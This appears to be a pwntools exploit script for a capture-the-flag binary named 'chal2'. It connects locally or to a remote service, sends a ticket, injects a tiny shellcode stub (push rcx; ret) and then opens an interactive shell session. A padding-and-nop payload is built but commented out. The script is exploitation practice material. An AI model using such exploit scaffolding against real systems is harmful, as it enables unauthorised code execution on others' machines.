from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "chal2"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"

TICKET = "764fce03d863b5155db4af260374acc1"

def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)
            
    def ticket(self):
        p = self.p
        p.send(TICKET)

    def send(self, content):
        p = self.p
        p.sendline(content)

x, p = init()
x.ticket()
x.debug("b *main+106\nc")

pay = asm(
    f'''
    push rcx
    ret
    '''
)
log.success(f"len: {len(pay)}")

x.send(pay)

pay = b"A"*1000
pay += asm(
    """
    nop
    nop
    nop
    """
)
# x.send(pay)
p.interactive()